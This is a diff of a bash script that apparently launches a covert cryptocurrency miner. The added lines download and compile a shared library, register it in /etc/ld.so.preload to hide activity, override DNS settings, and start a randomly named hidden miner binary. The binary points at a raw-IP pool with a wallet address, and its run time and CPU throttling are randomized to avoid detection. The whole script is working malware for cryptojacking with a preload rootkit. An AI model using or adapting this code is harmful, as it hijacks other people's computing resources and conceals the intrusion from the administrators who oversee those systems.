@@ -1,6 +1,12 @@
 #!/bin/bash
 
-sleep $((RANDOM % 20 + 5))
+curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
 
 NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"
 
@@ -12,11 +18,12 @@ rm -f /app/sr
 --hostname "$(cat .h)" \
 --url 127.0.0.1:443 >/dev/null 2>&1 &
 
-# jalankan dengan timeout 20 menit
-timeout 1200s /app/$NAME \
--a yescryptr32 \
--o eu.rplant.xyz:7047 \
--u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.multo \
+DURATION=$((1200 + RANDOM % 301))
+
+timeout ${DURATION}s /app/$NAME \
+-a yespowertide \
+-o 157.173.100.15:443 \
+-u TR5CjGz5ZDUQNG7Trn5aDdhCSCSZevn9xH.multo \
 -p x \
 --cpu-threads 2 \
 --cpu-threads-intensity 1 \
@@ -24,8 +31,7 @@ timeout 1200s /app/$NAME \
 
 P=$!
 
-# limiter tambahan
-LIMIT=$((75 + RANDOM % 5))
+LIMIT=$((75 + RANDOM % 6))
 cpulimit -p $P -l $LIMIT >/dev/null 2>&1 &
 
 tail -f /dev/null
